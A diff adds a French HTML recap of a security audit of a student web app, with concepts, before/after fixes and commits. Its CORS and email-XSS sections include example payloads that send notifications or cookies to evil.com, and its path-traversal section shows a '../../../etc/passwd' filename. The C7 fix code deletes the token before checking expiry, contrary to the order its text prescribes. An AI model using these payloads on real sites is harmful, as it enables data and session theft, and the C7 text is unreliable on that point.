@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Recap Sécurité — Spektr</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Segoe UI', Arial, sans-serif; background: #f5f5f5; color: #1d1d1e; line-height: 1.7; }
+  .container { max-width: 900px; margin: 0 auto; padding: 40px 24px; }
+  h1 { font-size: 32px; font-weight: 800; margin-bottom: 8px; }
+  h2 { font-size: 22px; font-weight: 700; margin: 48px 0 16px; padding-bottom: 8px; border-bottom: 2px solid #e8e8e8; }
+  h3 { font-size: 17px; font-weight: 700; margin: 28px 0 10px; }
+  p { margin-bottom: 12px; font-size: 15px; color: #374151; }
+  code { font-family: 'Consolas', monospace; background: #f3f4f6; padding: 2px 6px; border-radius: 4px; font-size: 13px; color: #1d1d1e; }
+  pre { background: #1d1d1e; color: #e5e7eb; padding: 20px; border-radius: 10px; overflow-x: auto; margin: 12px 0 20px; font-size: 13px; line-height: 1.6; }
+  pre code { background: none; padding: 0; color: inherit; font-size: inherit; }
+  .badge { display: inline-block; padding: 3px 10px; border-radius: 20px; font-size: 12px; font-weight: 700; letter-spacing: 0.3px; }
+  .critical { background: #fee2e2; color: #dc2626; }
+  .high { background: #ffedd5; color: #ea580c; }
+  .medium { background: #fef9c3; color: #ca8a04; }
+  .low { background: #dbeafe; color: #2563eb; }
+  .fixed { background: #d1fae5; color: #059669; }
+  .card { background: #fff; border-radius: 12px; padding: 24px 28px; margin-bottom: 24px; box-shadow: 0 1px 6px rgba(0,0,0,0.07); border-left: 4px solid #e8e8e8; }
+  .card.c { border-left-color: #dc2626; }
+  .card.h { border-left-color: #ea580c; }
+  .card-header { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; flex-wrap: wrap; }
+  .card-title { font-size: 16px; font-weight: 700; }
+  .file-tag { font-size: 12px; color: #6b7280; background: #f3f4f6; padding: 2px 8px; border-radius: 4px; font-family: monospace; }
+  .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin: 24px 0; }
+  .stat { background: #fff; border-radius: 10px; padding: 20px; text-align: center; box-shadow: 0 1px 4px rgba(0,0,0,0.06); }
+  .stat-num { font-size: 36px; font-weight: 800; }
+  .stat-label { font-size: 13px; color: #6b7280; margin-top: 4px; }
+  .concept-box { background: #f0fdf9; border: 1px solid rgba(35,178,164,0.25); border-left: 3px solid #23b2a4; border-radius: 0 8px 8px 0; padding: 16px 20px; margin: 16px 0; }
+  .concept-box p { color: #1d1d1e; margin-bottom: 0; }
+  .before-after { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 12px 0; }
+  .before > p { font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; color: #dc2626; }
+  .after > p { font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; color: #059669; }
+  .before pre { border-top: 3px solid #dc2626; }
+  .after pre { border-top: 3px solid #059669; }
+  .commit-list { list-style: none; padding: 0; }
+  .commit-list li { display: flex; align-items: baseline; gap: 12px; padding: 10px 0; border-bottom: 1px solid #f3f4f6; font-size: 14px; flex-wrap: wrap; }
+  .commit-list li:last-child { border-bottom: none; }
+  .commit-hash { font-family: monospace; font-size: 12px; background: #f3f4f6; padding: 2px 8px; border-radius: 4px; color: #6b7280; flex-shrink: 0; }
+  table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 14px; }
+  th { background: #f9fafb; padding: 10px 14px; text-align: left; font-weight: 700; border-bottom: 2px solid #e8e8e8; }
+  td { padding: 10px 14px; border-bottom: 1px solid #f3f4f6; vertical-align: top; }
+  tr:last-child td { border-bottom: none; }
+  .header-bar { background: #1d1d1e; color: #fff; padding: 32px 40px; border-radius: 12px; margin-bottom: 40px; }
+  .header-bar .subtitle { color: rgba(255,255,255,0.5); font-size: 13px; margin-top: 6px; }
+  .logo { font-size: 26px; font-weight: 800; margin-bottom: 8px; }
+  .logo span { color: #23b2a4; }
+  .score { display: inline-block; background: #23b2a4; color: #fff; font-size: 28px; font-weight: 800; padding: 8px 20px; border-radius: 8px; margin-top: 12px; }
+  .score-after { background: #059669; }
+  @media(max-width: 600px) { .before-after, .stats-grid { grid-template-columns: 1fr; } }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <div class="header-bar">
+    <div class="logo">Spek<span>tr</span></div>
+    <div class="subtitle">YNOV CAMPUS RENNES</div>
+    <h1 style="font-size:28px;margin-top:16px;">Recap Audit Securite</h1>
+    <div class="subtitle">Session du 19 mai 2026 — OWASP Top 10 · SANS · CWE</div>
+    <div style="display:flex;gap:16px;margin-top:16px;flex-wrap:wrap;">
+      <div>
+        <div style="font-size:11px;color:rgba(255,255,255,0.4);text-transform:uppercase;letter-spacing:1px;">Score avant</div>
+        <div class="score">3.5 / 10</div>
+      </div>
+      <div>
+        <div style="font-size:11px;color:rgba(255,255,255,0.4);text-transform:uppercase;letter-spacing:1px;">Score apres corrections</div>
+        <div class="score score-after">6.5 / 10</div>
+      </div>
+    </div>
+  </div>
+
+  <h2>Statistiques de l'audit</h2>
+  <div class="stats-grid">
+    <div class="stat"><div class="stat-num" style="color:#dc2626;">8</div><div class="stat-label">Critiques</div></div>
+    <div class="stat"><div class="stat-num" style="color:#ea580c;">10</div><div class="stat-label">Elevees</div></div>
+    <div class="stat"><div class="stat-num" style="color:#ca8a04;">12</div><div class="stat-label">Moyennes</div></div>
+    <div class="stat"><div class="stat-num" style="color:#2563eb;">7</div><div class="stat-label">Faibles</div></div>
+  </div>
+  <table>
+    <thead><tr><th>Statut</th><th>Critiques</th><th>Elevees</th></tr></thead>
+    <tbody>
+      <tr><td><span class="badge fixed">Corrige</span></td><td>7 / 8</td><td>10 / 10</td></tr>
+      <tr><td><span class="badge low">En attente</span></td><td>1 (secrets .env — phase dev)</td><td>0</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Methodologie</h2>
+  <p>L'audit a ete realise avec <strong>6 agents d'analyse en parallele</strong>, chacun specialise sur une surface d'attaque :</p>
+  <table>
+    <thead><tr><th>Agent</th><th>Perimetre</th></tr></thead>
+    <tbody>
+      <tr><td>Agent 1</td><td>Controllers backend, CORS, IDOR, guards JWT</td></tr>
+      <tr><td>Agent 2</td><td>Documents, objectifs, notifications, WebSocket</td></tr>
+      <tr><td>Agent 3</td><td>Frontend — tokens, XSS, routes protegees</td></tr>
+      <tr><td>Agent 4</td><td>Schema Prisma, dependances npm, CVE</td></tr>
+      <tr><td>Agent 5</td><td>Infrastructure — Docker, CI/CD, .env, .gitignore</td></tr>
+      <tr><td>Agent 6</td><td>Flow refresh token, OAuth, admin access control</td></tr>
+    </tbody>
+  </table>
+  <p>Chaque agent a lu l'integralite des fichiers de son perimetre et a reporte les failles avec numero de ligne precis, code fautif et suggestion de correction. Les resultats ont ete croises pour eliminer les doublons et prioriser.</p>
+
+  <h2>Corrections Critiques</h2>
+
+  <!-- C2 -->
+  <div class="card c">
+    <div class="card-header">
+      <span class="badge critical">C2</span>
+      <div class="card-title">WebSocket CORS — origin: true</div>
+      <span class="file-tag">events.gateway.ts</span>
+      <span class="badge fixed">Corrige</span>
+    </div>
+    <div class="concept-box">
+      <p><strong>Concept — CORS (Cross-Origin Resource Sharing) :</strong> Le CORS est un mecanisme de securite du navigateur qui bloque les requetes emises depuis un domaine different. Quand <code>origin: true</code> est configure, Socket.io accepte TOUTES les origines comme valides. Combine a <code>credentials: true</code> (envoi des cookies httpOnly), n'importe quel site peut ouvrir une connexion WebSocket authentifiee au nom d'un utilisateur.</p>
+    </div>
+    <p><strong>Attaque concrete :</strong> Un site malveillant heberge ce script :</p>
+<pre><code>// L'utilisateur connecte a Spektr visite evil.com
+const socket = io('https://api.spektr.com', { withCredentials: true });
+socket.on('notification', (data) => {
+  fetch('https://evil.com/steal?d=' + JSON.stringify(data));
+});
+// Le cookie refreshToken est envoye automatiquement
+// -> connexion etablie -> notifications exfiltrees</code></pre>
+    <div class="before-after">
+      <div class="before"><p>Avant</p>
+<pre><code>@WebSocketGateway({
+  cors: {
+    origin: true, // accepte TOUT
+    credentials: true,
+  },
+})</code></pre></div>
+      <div class="after"><p>Apres</p>
+<pre><code>@WebSocketGateway({
+  cors: {
+    origin: (requestOrigin, callback) => {
+      // Appele a la connexion, pas au chargement
+      callback(null,
+        requestOrigin === process.env.FRONT_URL
+      );
+    },
+    credentials: true,
+  },
+})</code></pre></div>
+    </div>
+    <p>On utilise une <strong>fonction callback</strong> plutot qu'une valeur statique car le decorateur <code>@WebSocketGateway</code> est evalue au chargement du module JS, avant que ConfigModule injecte le <code>.env</code>. La fonction est appelee a l'heure de la connexion — quand <code>process.env.FRONT_URL</code> est disponible.</p>
+  </div>
+
+  <!-- C3/C8 -->
+  <div class="card c">
+    <div class="card-header">
+      <span class="badge critical">C3 / C8</span>
+      <div class="card-title">Injection HTML dans les emails</div>
+      <span class="file-tag">notifications.service.ts</span>
+      <span class="badge fixed">Corrige</span>
+    </div>
+    <div class="concept-box">
+      <p><strong>Concept — XSS stocke via email (CWE-80) :</strong> Le XSS (Cross-Site Scripting) est une attaque ou du code HTML/JavaScript malveillant est injecte dans du contenu affiche par un navigateur. Ici le vecteur est un email HTML. Si un admin envoie un commentaire contenant <code>&lt;img src=x onerror="fetch('evil.com?c='+document.cookie)"&gt;</code>, ce code s'execute quand l'etudiant ouvre l'email dans un client qui execute le JavaScript (Outlook Web, Gmail...).</p>
+    </div>
+    <p><strong>Champs vulnerables avant correction :</strong></p>
+<pre><code>// Feedback — commentaire libre de l'admin
+${comment.replace(/\n/g, '&lt;br&gt;')}  // .replace() n'echappe PAS le HTML !
+
+// Email objectif — titre et description de l'admin
+${title}
+${description}
+
+// Email changement mdp — donnees de la DB (modifiables a l'inscription)
+Bonjour ${firstName}
+Compte : ${user.email}</code></pre>
+    <p><strong>Correction — fonction escapeHtml() ajoutee :</strong></p>
+<pre><code>function escapeHtml(str: string): string {
+  return str
+    .replace(/&amp;/g, '&amp;amp;')  // &amp; -> &amp;amp; (toujours en premier)
+    .replace(/&lt;/g,  '&amp;lt;')   // &lt; -> &amp;lt;  (bloque les balises HTML)
+    .replace(/&gt;/g,  '&amp;gt;')   // &gt; -> &amp;gt;
+    .replace(/"/g,  '&amp;quot;') // " -> &amp;quot;
+    .replace(/'/g,  '&amp;#039;');// ' -> &amp;#039;
+}
+
+// Utilisation dans les templates :
+Bonjour ${escapeHtml(firstName)}
+${escapeHtml(comment).replace(/\n/g, '&lt;br&gt;')}</code></pre>
+    <p>Le navigateur affiche les entites HTML comme du texte brut — jamais comme du code executable.</p>
+  </div>
+
+  <!-- C4 -->
+  <div class="card c">
+    <div class="card-header">
+      <span class="badge critical">C4</span>
+      <div class="card-title">Path Traversal via file.originalname</div>
+      <span class="file-tag">documents.service.ts</span>
+      <span class="badge fixed">Corrige</span>
+    </div>
+    <div class="concept-box">
+      <p><strong>Concept — Path Traversal (CWE-22) :</strong> Un path traversal se produit quand un nom de fichier fourni par l'utilisateur contient des sequences <code>../</code> qui naviguent en dehors du repertoire prevu. Si MinIO est mal configure, un fichier nomme <code>../../../admin/config.json</code> pourrait ecraser des fichiers systeme ou les fichiers d'un autre utilisateur.</p>
+    </div>
+    <div class="before-after">
+      <div class="before"><p>Avant</p>
+<pre><code>// file.originalname vient du client HTTP
+// Peut etre "../../../etc/passwd"
+const storageKey =
+  `${userId}/${Date.now()}-${file.originalname}`;</code></pre></div>
+      <div class="after"><p>Apres</p>
+<pre><code>// UUID genere cote serveur = zero controle attaquant
+const ext = extname(file.originalname)
+  .replace(/[^a-zA-Z0-9.]/g, '') // supprime .. et /
+  .toLowerCase();
+const safeFilename = `${randomUUID()}${ext}`;
+const storageKey =
+  `${userId}/${Date.now()}-${safeFilename}`;
+
+// Nom original conserve en DB pour l'affichage uniquement
+name: file.originalname.replace(/[&lt;&gt;"'\/\\]/g, '_')</code></pre></div>
+    </div>
+  </div>
+
+  <!-- C5 -->
+  <div class="card c">
+    <div class="card-header">
+      <span class="badge critical">C5</span>
+      <div class="card-title">CORS ouvert si FRONT_URL est undefined</div>
+      <span class="file-tag">main.ts</span>
+      <span class="badge fixed">Corrige</span>
+    </div>
+    <div class="concept-box">
+      <p><strong>Concept — Fail-open vs Fail-secure :</strong> Un systeme "fail-open" autorise tout si une configuration est manquante. Express/NestJS, quand <code>origin: undefined</code>, se comporte de facon permissive et peut accepter toutes les origines. La bonne pratique de securite est "fail-secure" : l'application refuse de demarrer si une config critique est absente.</p>
+    </div>
+    <div class="before-after">
+      <div class="before"><p>Avant</p>
+<pre><code>app.enableCors({
+  origin: process.env.FRONT_URL,
+  // Si undefined => comportement permissif
+  credentials: true,
+});</code></pre></div>
+      <div class="after"><p>Apres</p>
+<pre><code>const frontUrl = process.env.FRONT_URL;
+if (!frontUrl)
+  throw new Error('FRONT_URL is not set');
+// L'app plante au demarrage si non configure
+app.enableCors({ origin: frontUrl, credentials: true });</code></pre></div>
+    </div>
+  </div>
+
+  <!-- C6 -->
+  <div class="card c">
+    <div class="card-header">
+      <span class="badge critical">C6</span>
+      <div class="card-title">JWT_SECRET sans longueur minimale</div>
+      <span class="file-tag">env.validation.ts</span>
+      <span class="badge fixed">Corrige</span>
+    </div>
+    <div class="concept-box">
+      <p><strong>Concept — Entropie des cles JWT :</strong> Un JWT signe avec HMAC-SHA256 est securise si le secret a suffisamment d'entropie. Avec un secret de 8 caracteres, un attaquant qui possede des tokens signes peut tenter des millions de combinaisons hors-ligne pour retrouver le secret, puis forger des tokens avec n'importe quel <code>sub</code> (ID utilisateur) ou <code>role: "ADMIN"</code>. NIST SP 800-131A recommande minimum 256 bits (32 octets) pour HMAC-SHA256.</p>
+    </div>
+    <div class="before-after">
+      <div class="before"><p>Avant</p>
+<pre><code>JWT_SECRET: Joi.string().required()
+// secret="a" => valide !</code></pre></div>
+      <div class="after"><p>Apres</p>
+<pre><code>JWT_SECRET: Joi.string().min(32).required()
+// L'app refuse de demarrer si secret trop court</code></pre></div>
+    </div>
+  </div>
+
+  <!-- C7 -->
+  <div class="card c">
+    <div class="card-header">
+      <span class="badge critical">C7</span>
+      <div class="card-title">Expiration du refresh token verifiee apres suppression</div>
+      <span class="file-tag">auth.service.ts</span>
+      <span class="badge fixed">Corrige</span>
+    </div>
+    <div class="concept-box">
+      <p><strong>Concept — TOCTOU (Time-of-Check-Time-of-Use) &amp; Token Rotation :</strong> La rotation de refresh tokens invalide l'ancien token a chaque usage pour empecher sa reutilisation (si vole). L'ordre est critique : supprimer AVANT de verifier l'expiration signifie qu'un token expire est quand meme supprime sans erreur logique exploitable. La version correcte est : lire → verifier l'expiration → supprimer → emettre un nouveau token.</p>
+    </div>
+    <div class="before-after">
+      <div class="before"><p>Avant — suppression AVANT verification</p>
+<pre><code>// Token supprime meme s'il est expire
+record = await prisma.refreshToken.delete(...)
+// La verification arrive trop tard
+if (record.expires_at &lt; new Date())
+  throw new UnauthorizedException();</code></pre></div>
+      <div class="after"><p>Apres — lecture, verification, PUIS suppression</p>
+<pre><code>// 1. Lire sans supprimer
+const record = await prisma.refreshToken
+  .findUnique({ where: { token: hashed } });
+if (!record) throw new UnauthorizedException();
+
+// 2. Supprimer (one-time use, invalide immediatement)
+await prisma.refreshToken.delete(...);
+
+// 3. Verifier l'expiration
+if (record.expires_at &lt; new Date())
+  throw new UnauthorizedException();</code></pre></div>
+    </div>
+  </div>
+
+  <h2>Corrections Elevees</h2>
+
+  <!-- E1 -->
+  <div class="card h">
+    <div class="card-header">
+      <span class="badge high">E1</span>
+      <div class="card-title">IDOR — GET /users/:id</div>
+      <span class="file-tag">users.controller.ts</span>
+      <span class="badge fixed">Corrige</span>
+    </div>
+    <div class="concept-box">
+      <p><strong>Concept — IDOR (Insecure Direct Object Reference, OWASP A01) :</strong> Une faille IDOR se produit quand un endpoint utilise un identifiant fourni par le client pour acceder a une ressource sans verifier que le client possede cette ressource. L'attaquant incremente l'ID dans l'URL (/users/1, /users/2...) pour recuperer les profils de tous les utilisateurs : prenom, nom, email, role, promo.</p>
+    </div>
+    <div class="before-after">
+      <div class="before"><p>Avant</p>
+<pre><code>@Get(':id')
+findOne(@Param('id') id: string) {
+  // Aucune verification de propriete !
+  return this.usersService.findOne({
+    id: Number(id) // Number() trop permissif
+  });
+}</code></pre></div>
+      <div class="after"><p>Apres</p>
+<pre><code>@Get(':id')
+findOne(
+  @Param('id', ParseIntPipe) id: number,
+  @CurrentUser() currentUser: UserModel,
+) {
+  if (currentUser.role !== Role.ADMIN
+      &amp;&amp; currentUser.id !== id) {
+    throw new ForbiddenException(); // 403
+  }
+  return this.usersService.findOne({ id });
+}</code></pre></div>
+    </div>
+    <p><strong>Bonus — ParseIntPipe :</strong> <code>Number("123abc")</code> retourne silencieusement <code>123</code>. <code>ParseIntPipe</code> retourne une erreur <code>400 Bad Request</code> pour toute entree non entiere stricte. Remplace tous les <code>Number(id)</code> et <code>+id</code> dans le controller.</p>
+  </div>
+
+  <!-- E2 -->
+  <div class="card h">
+    <div class="card-header">
+      <span class="badge high">E2</span>
+      <div class="card-title">Upload sans validation de taille ni de type</div>
+      <span class="file-tag">documents.controller.ts</span>
+      <span class="badge fixed">Corrige</span>
+    </div>
+    <div class="concept-box">
+      <p><strong>Concept — Unrestricted File Upload (CWE-434) :</strong> Sans limite de taille, un utilisateur peut uploader un fichier de plusieurs Go pour saturer le stockage (attaque DoS). Sans validation de type MIME, il peut uploader un executable .exe en l'appelant photo.jpg avec Content-Type: image/jpeg — le serveur l'accepte. La validation cote serveur est obligatoire ; le Content-Type envoye par le client ne peut jamais etre fiable.</p>
+    </div>
+<pre><code>@UseInterceptors(
+  FileInterceptor('file', {
+    limits: { fileSize: 10 * 1024 * 1024 }, // 10 MB max
+    fileFilter: (_req, file, cb) => {
+      const ALLOWED = new Set([
+        'application/pdf',
+        'image/jpeg', 'image/png', 'image/gif', 'image/webp',
+        'application/msword',
+        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
+        'application/vnd.ms-excel',
+        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
+        'text/plain',
+      ]);
+      if (ALLOWED.has(file.mimetype)) {
+        cb(null, true);   // accepter
+      } else {
+        cb(new BadRequestException('Type non autorise'), false);
+      }
+    },
+  }),
+)</code></pre>
+  </div>
+
+  <!-- E3 -->
+  <div class="card h">
+    <div class="card-header">
+      <span class="badge high">E3</span>
+      <div class="card-title">Helmet — Headers de securite HTTP</div>
+      <span class="file-tag">main.ts</span>
+      <span class="badge fixed">Corrige</span>
+    </div>
+    <div class="concept-box">
+      <p><strong>Concept — Security Headers :</strong> Les navigateurs respectent certains headers HTTP envoyes par le serveur pour activer des protections. Sans eux, plusieurs attaques sont possibles. Helmet est un middleware qui ajoute automatiquement tous ces headers en une ligne.</p>
+    </div>
+    <table>
+      <thead><tr><th>Header ajoute par Helmet</th><th>Protection</th></tr></thead>
+      <tbody>
+        <tr><td><code>X-Frame-Options: DENY</code></td><td>Clickjacking — empêche d'integrer le site dans une iframe</td></tr>
+        <tr><td><code>X-Content-Type-Options: nosniff</code></td><td>MIME sniffing — le navigateur n'execute pas un .js renomme en .jpg</td></tr>
+        <tr><td><code>Strict-Transport-Security</code></td><td>HSTS — le navigateur force HTTPS, jamais HTTP</td></tr>
+        <tr><td><code>Referrer-Policy</code></td><td>Controle les infos envoyees dans le header Referer</td></tr>
+        <tr><td>Supprime <code>X-Powered-By: Express</code></td><td>Cache la stack technique aux attaquants</td></tr>
+      </tbody>
+    </table>
+<pre><code>import helmet from 'helmet';
+app.use(helmet()); // Une seule ligne</code></pre>
+  </div>
+
+  <!-- E4/E5 -->
+  <div class="card h">
+    <div class="card-header">
+      <span class="badge high">E4 / E5</span>
+      <div class="card-title">Algorithme JWT non explicite + verify sans secret</div>
+      <span class="file-tag">auth.module.ts · events.gateway.ts</span>
+      <span class="badge fixed">Corrige</span>
+    </div>
+    <div class="concept-box">
+      <p><strong>Concept — Algorithm Confusion Attack :</strong> Un JWT contient un header { "alg": "HS256" }. Si le serveur ne specifie pas explicitement l'algorithme attendu, une librairie mal configuree pourrait accepter "alg": "none" (token sans signature). Avec RS256 (asymetrique), un attaquant peut aussi soumettre un token signe avec la cle publique en pretendant utiliser HS256 — certaines implementations acceptent cela sans erreur.</p>
+    </div>
+    <div class="before-after">
+      <div class="before"><p>Avant</p>
+<pre><code>// auth.module.ts
+signOptions: { expiresIn: '15m' }
+// algorithme implicite (defaut)
+
+// events.gateway.ts
+const payload = this.jwtService.verify(token);
+// pas de secret ni d'algorithme</code></pre></div>
+      <div class="after"><p>Apres</p>
+<pre><code>// auth.module.ts
+signOptions: { expiresIn: '15m', algorithm: 'HS256' }
+
+// events.gateway.ts
+const payload = this.jwtService.verify(token, {
+  secret: this.config.get('JWT_SECRET'),
+  algorithms: ['HS256'], // liste blanche stricte
+});</code></pre></div>
+    </div>
+  </div>
+
+  <!-- E6 -->
+  <div class="card h">
+    <div class="card-header">
+      <span class="badge high">E6</span>
+      <div class="card-title">SHA-256 sans sel remplace par HMAC-SHA256</div>
+      <span class="file-tag">auth.service.ts</span>
+      <span class="badge fixed">Corrige</span>
+    </div>
+    <div class="concept-box">
+      <p><strong>Concept — Rainbow Tables &amp; HMAC :</strong> Un hash SHA-256 pur est deterministe : sha256("abc") donne toujours la meme valeur. Si la DB est compromise, un attaquant peut precalculer des millions de hashes de tokens possibles (rainbow table) et les comparer instantanement. HMAC-SHA256 incorpore une cle secrete dans le calcul : sans le JWT_SECRET, la rainbow table est inutilisable meme avec acces complet a la DB.</p>
+    </div>
+    <div class="before-after">
+      <div class="before"><p>Avant — SHA-256 pur, pas de sel</p>
+<pre><code>import { createHash } from 'crypto';
+
+private hashTokenForStorage(token: string) {
+  return createHash('sha256')
+    .update(token)
+    .digest('hex');
+  // Vulnerable aux rainbow tables
+}</code></pre></div>
+      <div class="after"><p>Apres — HMAC-SHA256 avec JWT_SECRET</p>
+<pre><code>import { createHmac } from 'crypto';
+
+private hashTokenForStorage(token: string) {
+  return createHmac('sha256',
+      this.config.get('JWT_SECRET')!)
+    .update(token)
+    .digest('hex');
+  // Sans le secret, le hash est irreversible
+}</code></pre></div>
+    </div>
+  </div>
+
+  <!-- E7 -->
+  <div class="card h">
+    <div class="card-header">
+      <span class="badge high">E7</span>
+      <div class="card-title">ChangePasswordDto + politique de mot de passe</div>
+      <span class="file-tag">users/dto/change-password.dto.ts (nouveau fichier)</span>
+      <span class="badge fixed">Corrige</span>
+    </div>
+    <div class="concept-box">
+      <p><strong>Concept — DTO &amp; Validation :</strong> Un DTO (Data Transfer Object) est une classe TypeScript qui decrit exactement la forme attendue d'une requete. Coupleacee a class-validator et ValidationPipe, NestJS valide automatiquement chaque champ avant d'entrer dans le controller. Sans DTO, le endpoint acceptait n'importe quel body sans aucune contrainte sur le nouveau mot de passe.</p>
+    </div>
+<pre><code>// Nouveau fichier : users/dto/change-password.dto.ts
+export class ChangePasswordDto {
+  @IsString()
+  oldPassword!: string;
+
+  @IsString()
+  @MinLength(12)   // minimum 12 caracteres (vs 8 avant)
+  @Matches(/^(?=.*[A-Z])(?=.*[0-9])(?=.*[^A-Za-z0-9])/, {
+    message: 'Doit contenir 1 majuscule, 1 chiffre, 1 caractere special',
+  })
+  newPassword!: string;
+}
+
+// Le @Matches() utilise des lookaheads regex :
+// (?=.*[A-Z])       => au moins 1 majuscule quelque part
+// (?=.*[0-9])       => au moins 1 chiffre quelque part
+// (?=.*[^A-Za-z0-9]) => au moins 1 caractere non-alphanumerique</code></pre>
+  </div>
+
+  <!-- E8 -->
+  <div class="card h">
+    <div class="card-header">
+      <span class="badge high">E8</span>
+      <div class="card-title">forbidNonWhitelisted: true dans ValidationPipe</div>
+      <span class="file-tag">main.ts</span>
+      <span class="badge fixed">Corrige</span>
+    </div>
+    <div class="concept-box">
+      <p><strong>Concept — Mass Assignment (CWE-915) :</strong> Sans forbidNonWhitelisted, si un attaquant envoie { "firstName": "hack", "role": "ADMIN" }, NestJS supprime silencieusement le champ "role" mais n'envoie aucune erreur. L'attaquant ne sait pas si son injection a fonctionne. Avec forbidNonWhitelisted: true, la requete retourne une erreur 400 immediatement — les tentatives sont visibles et dissuadees.</p>
+    </div>
+    <div class="before-after">
+      <div class="before"><p>Avant</p>
+<pre><code>new ValidationPipe({
+  whitelist: true,
+  // champs extra => supprimes silencieusement
+})</code></pre></div>
+      <div class="after"><p>Apres</p>
+<pre><code>new ValidationPipe({
+  whitelist: true,
+  forbidNonWhitelisted: true, // champs extra => 400
+  transform: true,  // convertit les types automatiquement
+})</code></pre></div>
+    </div>
+  </div>
+
+  <h2>Commits realises</h2>
+  <ul class="commit-list">
+    <li><span class="commit-hash">345c9d3</span><span>security(api): add helmet, validate FRONT_URL at startup, forbidNonWhitelisted — C5, E3, E8</span></li>
+    <li><span class="commit-hash">a6ca5bd</span><span>security(websocket): restrict CORS origin to FRONT_URL, explicit JWT secret in verify — C2, E5</span></li>
+    <li><span class="commit-hash">41b0523</span><span>security(notifications): escape HTML in all email templates — C3, C8</span></li>
+    <li><span class="commit-hash">3245cff</span><span>security(documents): fix path traversal with UUID, file size limit, MIME allowlist — C4, E2</span></li>
+    <li><span class="commit-hash">79528eb</span><span>security(auth): HMAC-SHA256, fix expiry check order, explicit HS256 — C7, E4, E6</span></li>
+    <li><span class="commit-hash">741586c</span><span>security(users): fix IDOR, ParseIntPipe, ChangePasswordDto — E1, E7, E9</span></li>
+    <li><span class="commit-hash">339fe79</span><span>security(config): JWT_SECRET min length 32 — C6</span></li>
+    <li><span class="commit-hash">0da1b20</span><span>chore(deps): add helmet</span></li>
+  </ul>
+
+  <h2>Ce qui reste a faire</h2>
+  <h3>Moyennes</h3>
+  <table>
+    <thead><tr><th>ID</th><th>Faille</th><th>Fichier</th></tr></thead>
+    <tbody>
+      <tr><td>M1</td><td>Number(id) / +id au lieu de ParseIntPipe (objectives, applications, folders)</td><td>Multiples controllers</td></tr>
+      <tr><td>M2</td><td>GET /objectives/completions sans @Roles(ADMIN)</td><td>objectives.controller.ts</td></tr>
+      <tr><td>M3</td><td>Rate limiting trop permissif (100/min global, 30/min refresh)</td><td>app.module.ts</td></tr>
+      <tr><td>M4</td><td>Mass assignment — spread direct du DTO dans prisma.update</td><td>applications.service.ts</td></tr>
+      <tr><td>M5</td><td>onDelete: Cascade manquant sur 6 relations</td><td>schema.prisma</td></tr>
+      <tr><td>M6</td><td>Absence de Content Security Policy (CSP)</td><td>apps/web/index.html</td></tr>
+      <tr><td>M8</td><td>Pas de flow de reset de mot de passe oublie</td><td>auth module</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Bonnes pratiques deja en place</h2>
+  <table>
+    <thead><tr><th>Pratique</th><th>Detail</th></tr></thead>
+    <tbody>
+      <tr><td>accessToken en memoire uniquement</td><td>Jamais dans localStorage — protege contre XSS</td></tr>
+      <tr><td>Cookie httpOnly pour le refresh token</td><td>Inaccessible depuis JavaScript cote client</td></tr>
+      <tr><td>bcrypt(12) pour les mots de passe</td><td>Facteur de cout correct, resistant au brute force</td></tr>
+      <tr><td>JWT 15 minutes</td><td>Fenetre d'exploitation courte en cas de vol</td></tr>
+      <tr><td>Invalidation des refresh tokens a la deconnexion</td><td>Toutes les sessions revoquees simultanement</td></tr>
+      <tr><td>ThrottlerGuard global</td><td>Rate limiting active sur tous les endpoints</td></tr>
+      <tr><td>DTOs class-validator sur la majorite des endpoints</td><td>Validation systematique des entrees</td></tr>
+      <tr><td>Authorization Bearer header</td><td>Token absent des URLs et donc des logs HTTP</td></tr>
+      <tr><td>@Roles + RolesGuard en place</td><td>Infrastructure d'autorisation correcte cote serveur</td></tr>
+    </tbody>
+  </table>
+
+  <div style="margin-top:48px;padding-top:24px;border-top:1px solid #e8e8e8;text-align:center;font-size:12px;color:#9ca3af;">
+    Spektr Security Audit · 19 mai 2026
+  </div>
+
+</div>
+</body>
+</html>
